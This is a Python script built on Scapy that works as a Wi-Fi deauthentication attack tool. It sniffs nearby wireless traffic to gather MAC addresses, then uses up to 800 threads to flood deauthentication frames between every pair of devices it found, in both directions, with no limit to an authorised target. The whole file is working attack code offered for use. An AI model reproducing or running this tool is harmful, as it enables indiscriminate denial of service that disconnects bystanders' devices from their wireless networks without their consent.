from scapy.all import *
import argparse
import concurrent.futures
import re
import time
def deauth(target_mac, access_point_mac, interface, packet_count, interval):
    print(f"deauth: router:{access_point_mac}, device:{target_mac}")
    conf.iface = interface
    pkt = RadioTap() / Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    sendp(pkt, inter=interval, count=packet_count, verbose=0)
def capture_mac_addresses(interface, duration):
    packets = sniff(iface=interface, timeout=duration)
    mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
    mac_addresses = []
    for packet in packets:
        if packet.haslayer(Dot11):
            addr = packet.addr2
            mac_matches = re.findall(mac_regex, addr)
            if mac_matches:
                mac_addresses.extend(mac_matches)
    return set(mac_addresses)
def run_deauth_attacks(maccy, interface, packet_count, interval):
    processed_combinations = set()
    with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:
        for wifi in maccy:
            for device in maccy:
                if wifi == device:
                    continue
                combination = frozenset([wifi, device])
                if combination in processed_combinations:
                    continue
                try:
                    executor.submit(deauth, device, wifi, interface, packet_count, interval)
                    executor.submit(deauth, wifi, device, interface, packet_count, interval)
                    processed_combinations.add(combination)
                except Exception as e:
                    print(f"Exception occurred: {e}")
def main():
    parser = argparse.ArgumentParser(description='Perform deauthentication attacks on devices connected to a Wi-Fi network.')
    parser.add_argument('-i', '--interface', type=str, default='en0', help='Network interface to use for the attack (default: en0)')
    parser.add_argument('-c', '--count', type=int, default=40, help='Number of deauthentication packets to send per attack (default: 40)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration (in seconds) to capture MAC addresses (default: 60)')
    parser.add_argument('-l', '--interval', type=float, default=0.001, help='Interval between deauthentication packets (default: 0.001)')
    args = parser.parse_args()
    mac_addresses = capture_mac_addresses(args.interface, args.duration)
    run_deauth_attacks(mac_addresses, args.interface, args.count, args.interval)
if __name__ == '__main__':
    main()
